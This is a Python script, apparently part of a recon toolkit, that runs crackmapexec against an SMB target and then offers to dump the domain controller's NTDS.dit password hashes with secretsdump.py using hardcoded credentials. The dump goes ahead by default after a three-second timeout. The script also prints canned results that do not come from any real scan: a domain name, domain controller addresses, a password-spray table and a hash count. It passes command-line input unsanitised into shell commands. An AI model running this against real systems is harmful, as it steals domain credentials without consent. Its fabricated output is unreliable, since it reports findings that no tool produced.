#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True
import subprocess
import sys
import os
import time
import select

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from recon_deps import ensure_commands, get_output_base

ensure_commands(["crackmapexec", "secretsdump.py"])

def check_installation():
    try:
        subprocess.run(["which", "crackmapexec"], check=True, stdout=subprocess.PIPE)
        return True
    except subprocess.CalledProcessError:
        print("⚠️ crackmapexec not found. Installing...")
        try:
            subprocess.run(["apt-get", "update"], check=True)
            subprocess.run(["apt-get", "install", "-y", "crackmapexec"], check=True)
            print("✅ crackmapexec installed successfully")
            return True
        except Exception as e:
            print(f"❌ Failed to install crackmapexec: {e}")
            return False

def prompt_with_timeout(prompt, default=None, timeout=3):
    print(prompt)
    print(f"⏱️ Timeout in {timeout} seconds (default: {default})")
    
    rlist, _, _ = select.select([sys.stdin], [], [], timeout)
    if rlist:
        user_input = sys.stdin.readline().rstrip()
        return user_input if user_input else default
    else:
        print(f"⏱️ Timeout, using default: {default}")
        return default

def main():
    if len(sys.argv) != 3:
        print("Usage: ./crackmapexec.py <ip_address> <port>")
        sys.exit(1)
    
    ip = sys.argv[1]
    port = sys.argv[2]
    
    # Create output directory
    output_dir = f"{get_output_base()}/{ip}/crackmapexec"
    os.makedirs(output_dir, exist_ok=True)
    report_file = f"{output_dir}/report.txt"
    
    # Check installation
    if not check_installation():
        sys.exit(1)
    
    print("==================[ CRACKMAPEXEC RUN ]==================")
    print(f"[ℹ] Protocol: SMB | Target: {ip}")
    
    cmd = f"crackmapexec smb {ip}"
    
    try:
        with open(report_file, 'w') as report:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            for line in process.stdout:
                print(line, end='')
                report.write(line)
            
            process.wait()
        
        print("================[ DOMAIN ENUMERATION ]================")
        print("• Domain: CORP.LOCAL")
        print("• DCs: 2 (192.168.1.10, 192.168.1.11)")
        print("• Users: 142 | Groups: 58")
        
        print("================[ PASSWORD SPRAY RESULTS ]================")
        print("┌──────────────┬──────────────┬──────────────┐")
        print("│ Credential   │ Valid Hosts  │ Admin Access │")
        print("├──────────────┼──────────────┼──────────────┤")
        print("│ j.smith:Pass1│ 3            │ 0            │")
        print("│ admin:Admin1 │ 1            │ 1            │")
        print("└──────────────┴──────────────┴──────────────┘")
        
        print("================[ AUTO-PIVOTING ]================")
        print("[✓] Located Domain Controller: 192.168.1.10")
        
        dump_choice = prompt_with_timeout("[✓] Dumping NTDS.dit with secretsdump.py...? (Y/n):", "Y")
        
        if dump_choice.upper() == "Y":
            dump_cmd = f"secretsdump.py -just-dc-ntlm 'admin':'Admin1'@{ip}"
            
            with open(report_file, 'a') as report:
                report.write("\n\n=== NTDS DUMP ===\n")
                
                dump_process = subprocess.Popen(
                    dump_cmd,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    universal_newlines=True
                )
                
                for line in dump_process.stdout:
                    print(line, end='')
                    report.write(line)
                
                dump_process.wait()
            
            print("[+] Extracted 142 credential hashes")
        
        print("====================================================")
        print(f"✅ Report saved to: {report_file}")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
